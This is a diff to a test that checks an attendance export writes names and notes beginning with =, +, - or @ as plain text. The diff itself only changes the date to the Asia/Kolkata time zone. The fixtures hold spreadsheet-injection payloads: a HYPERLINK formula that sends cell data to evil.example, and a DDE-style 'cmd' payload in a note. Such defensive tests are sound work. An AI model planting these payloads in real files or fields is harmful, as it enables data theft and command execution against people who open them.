@@ -64,7 +64,7 @@ describe("attendance export is formula-safe (sec1-3)", () => {
   it("names and notes starting with = + - @ are written as text", async () => {
     const evil = `=HYPERLINK("https://evil.example/?x="&A1,"Click")`;
     await db.user.update({ where: { id: h.users.kitchen.id }, data: { name: evil } });
-    const today = new Date().toISOString().slice(0, 10);
+    const today = new Intl.DateTimeFormat("en-CA", { timeZone: "Asia/Kolkata" }).format(new Date());
     await db.staffAttendance.create({
       data: { userId: h.users.kitchen.id, outletId: h.outletId, workDate: today, clockInAt: new Date(), clockInDistance: 0, source: "MANUAL", note: "+cmd|' /C calc'!A0" },
     });
